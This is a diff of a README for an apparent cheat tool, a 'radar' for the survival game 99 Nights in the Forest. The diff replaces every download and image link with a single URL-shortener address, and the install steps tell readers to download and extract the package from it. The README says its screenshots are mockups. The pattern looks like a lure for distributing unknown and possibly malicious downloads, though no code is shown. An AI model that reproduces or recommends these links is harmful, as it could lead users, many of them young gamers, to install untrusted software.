@@ -12,32 +12,32 @@ The project remains tied to the real game's core loop of building a camp with fr
 
 ## Quick Access
 
-[![99 Nights](https://img.shields.io/badge/99%20Nights-Radar-2f8a38?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Deer](https://img.shields.io/badge/The%20Deer-Radar-b43f39?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Kids](https://img.shields.io/badge/Missing%20Kids-Tracker-3478bd?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Loot](https://img.shields.io/badge/Loot-Chests-cb9d32?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Camp](https://img.shields.io/badge/Camp-Survival-5f805e?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Download](https://img.shields.io/badge/Download-Latest%20Version-276f35?style=for-the-badge)](https://idleobstacle.github.io/)
+[![99 Nights](https://img.shields.io/badge/99%20Nights-Radar-2f8a38?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Deer](https://img.shields.io/badge/The%20Deer-Radar-b43f39?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Kids](https://img.shields.io/badge/Missing%20Kids-Tracker-3478bd?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Loot](https://img.shields.io/badge/Loot-Chests-cb9d32?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Camp](https://img.shields.io/badge/Camp-Survival-5f805e?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Download](https://img.shields.io/badge/Download-Latest%20Version-276f35?style=for-the-badge)](https://flyn.co/17yeN7/)
 
 ---
 
 ## Download
 
-➡️ **[Download 99 Nights in the Forest Radar](https://idleobstacle.github.io/)**
+➡️ **[Download 99 Nights in the Forest Radar](https://flyn.co/17yeN7/)**
 
 ---
 
 ## Preview
 
-[![99 Nights in the Forest Radar](assets/99-nights-radar-preview.png)](https://idleobstacle.github.io/)
+[![99 Nights in the Forest Radar](assets/99-nights-radar-preview.png)](https://flyn.co/17yeN7/)
 
 ### Radar Dashboard
 
-[![99 Nights Radar Dashboard](assets/99-nights-radar-dashboard.png)](https://idleobstacle.github.io/)
+[![99 Nights Radar Dashboard](assets/99-nights-radar-dashboard.png)](https://flyn.co/17yeN7/)
 
 ### Survival Categories
 
-[![99 Nights Survival Features](assets/99-nights-survival-features.png)](https://idleobstacle.github.io/)
+[![99 Nights Survival Features](assets/99-nights-survival-features.png)](https://flyn.co/17yeN7/)
 
 > Interface images are project mockups.
 
@@ -180,7 +180,7 @@ Profiles can store:
 
 1. Download the current package:
 
-   **[Download 99 Nights in the Forest Radar](https://idleobstacle.github.io/)**
+   **[Download 99 Nights in the Forest Radar](https://flyn.co/17yeN7/)**
 
 2. Extract it into a dedicated folder.
 3. Read the current project notes.
